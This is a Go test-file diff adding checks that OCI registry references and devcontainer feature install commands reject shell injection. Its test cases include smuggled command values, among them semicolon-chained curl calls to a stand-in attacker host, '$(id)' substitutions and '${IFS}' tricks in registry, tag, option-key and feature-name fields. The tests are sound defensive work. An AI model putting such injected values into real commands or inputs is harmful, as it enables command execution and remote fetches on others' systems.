@@ -145,6 +145,80 @@ func TestFeatureInstallCommand_OCIFallback(t *testing.T) {
 	}
 }
 
+func TestValidateOCIRef(t *testing.T) {
+	tests := []struct {
+		registry string
+		repo     string
+		tag      string
+		wantErr  bool
+	}{
+		// Valid references
+		{"ghcr.io", "owner/repo/feature", "latest", false},
+		{"ghcr.io", "grahambrooks/codemap/codemap", "2026.3.29", false},
+		{"myregistry.azurecr.io", "features/tool", "v1", false},
+		// Invalid registry — shell metacharacters
+		{"ghcr.io;curl attacker.com", "owner/repo", "latest", true},
+		{"ghcr.io$(id)", "owner/repo", "latest", true},
+		{"ghcr.io|evil", "owner/repo", "latest", true},
+		// Invalid repo — uppercase, path traversal, metacharacters
+		{"ghcr.io", "Owner/Repo", "latest", true},
+		{"ghcr.io", "../escape", "latest", true},
+		{"ghcr.io", "owner/repo;evil", "latest", true},
+		{"ghcr.io", "owner/repo$(id)", "latest", true},
+		// Invalid tag — shell metacharacters
+		{"ghcr.io", "owner/repo", "latest;evil", true},
+		{"ghcr.io", "owner/repo", "$(id)", true},
+	}
+
+	for _, tt := range tests {
+		err := validateOCIRef(tt.registry, tt.repo, tt.tag)
+		if (err != nil) != tt.wantErr {
+			t.Errorf("validateOCIRef(%q, %q, %q) error = %v, wantErr %v",
+				tt.registry, tt.repo, tt.tag, err, tt.wantErr)
+		}
+	}
+}
+
+func TestOCIFeatureInstallCommand_RejectsInvalidRef(t *testing.T) {
+	// Malicious registry with shell injection attempt should return empty string
+	malicious := "ghcr.io;curl${IFS}attacker.com/owner/repo/feature:latest"
+	cmd := ociFeatureInstallCommand(malicious, nil)
+	if cmd != "" {
+		t.Errorf("expected empty command for invalid OCI ref, got: %s", cmd)
+	}
+}
+
+func TestOCIFeatureInstallCommand_RejectsInvalidOptionKey(t *testing.T) {
+	opts := map[string]string{
+		"version":             "1.0",
+		"bad key with spaces": "value",
+		"bad$(injection)":     "value",
+		"valid_KEY":           "ok",
+	}
+	cmd := ociFeatureInstallCommand("ghcr.io/owner/repo/feature:latest", opts)
+	if strings.Contains(cmd, "bad key with spaces") {
+		t.Error("command should not contain invalid option key with spaces")
+	}
+	if strings.Contains(cmd, "bad$(injection)") {
+		t.Error("command should not contain option key with shell metacharacters")
+	}
+	// Valid keys should still be present
+	if !strings.Contains(cmd, "VERSION") {
+		t.Error("command should contain valid VERSION option")
+	}
+	if !strings.Contains(cmd, "VALID_KEY") {
+		t.Error("command should contain valid VALID_KEY option")
+	}
+}
+
+func TestFeatureInstallCommand_RejectsUnsafeName(t *testing.T) {
+	malicious := "$(curl attacker.com)"
+	cmd := featureInstallCommand(malicious, nil)
+	if cmd != "" {
+		t.Errorf("expected empty command for unsafe feature name, got: %s", cmd)
+	}
+}
+
 func TestBuildTag_Deterministic(t *testing.T) {
 	features := map[string]interface{}{
 		"ghcr.io/devcontainers/features/node:1": map[string]interface{}{"version": "lts"},
